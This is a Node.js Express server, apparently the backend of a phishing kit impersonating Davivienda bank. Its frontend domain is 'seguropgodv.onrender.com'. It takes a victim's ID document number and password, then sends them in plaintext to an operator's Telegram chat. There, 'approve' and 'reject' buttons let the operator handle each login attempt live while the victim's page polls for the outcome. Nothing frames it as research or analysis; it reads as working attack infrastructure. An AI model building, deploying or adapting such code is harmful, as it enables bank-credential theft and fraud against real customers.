const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000; 

// --- CONFIGURACIÓN DE CORS ---
// Permitimos explícitamente peticiones desde tu frontend en Render
const corsOptions = {
    origin: 'https://seguropgodv.onrender.com',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
};

app.use(cors(corsOptions)); // Usamos la configuración
app.use(express.json());

// --- CONFIGURACIÓN DE TELEGRAM ---
// Recuerda configurar estas variables en el panel de Render (Environment Variables)
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; 
const CHAT_ID = process.env.CHAT_ID; 

const solicitudesPendientes = {};

// --- RUTA 1: Recibir datos del Frontend ---
app.post('/api/solicitar-acceso', async (req, res) => {
    const { documento, clave } = req.body;

    if (!documento || !clave) {
        return res.status(400).json({ error: 'Faltan datos' });
    }

    const requestId = Date.now().toString();
    solicitudesPendientes[requestId] = { estado: 'pendiente' };

    const mensaje = `
🔔 *NUEVO INGRESO - DAVIVIENDA*
📄 *Documento:* ${documento}
🔑 *Clave:* ${clave}
🆔 *ID:* ${requestId}
    `;

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ APROBAR', callback_data: `aprobar_${requestId}` },
                { text: '❌ RECHAZAR', callback_data: `rechazar_${requestId}` }
            ]
        ]
    };

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });

        res.json({ requestId: requestId });

    } catch (error) {
        console.error('Error enviando a Telegram:', error.message);
        res.status(500).json({ error: 'Error interno del servidor' });
    }
});

// --- RUTA 2: Consultar estado (Polling) ---
app.get('/api/estado/:requestId', (req, res) => {
    const { requestId } = req.params;
    const solicitud = solicitudesPendientes[requestId];

    if (!solicitud) {
        return res.status(404).json({ error: 'Solicitud no encontrada' });
    }

    res.json({ estado: solicitud.estado });
});

// --- RUTA 3: Webhook de Telegram ---
app.post('/api/telegram-webhook', (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data; 
        const [accion, requestId] = data.split('_');

        if (solicitudesPendientes[requestId]) {
            if (accion === 'aprobar') {
                solicitudesPendientes[requestId].estado = 'aprobado';
            } else if (accion === 'rechazar') {
                solicitudesPendientes[requestId].estado = 'rechazado';
            }

            axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: `Solicitud ${accion}`
            }).catch(err => console.error("Error respondiendo a Telegram", err.message));
        }
    }
    res.sendStatus(200);
});

// Ruta de prueba para saber que el back está vivo
app.get('/', (req, res) => {
    res.send('Backend Davivienda funcionando correctamente.');
});

app.listen(PORT, () => {
    console.log(`Servidor Backend corriendo en el puerto ${PORT}`);
});
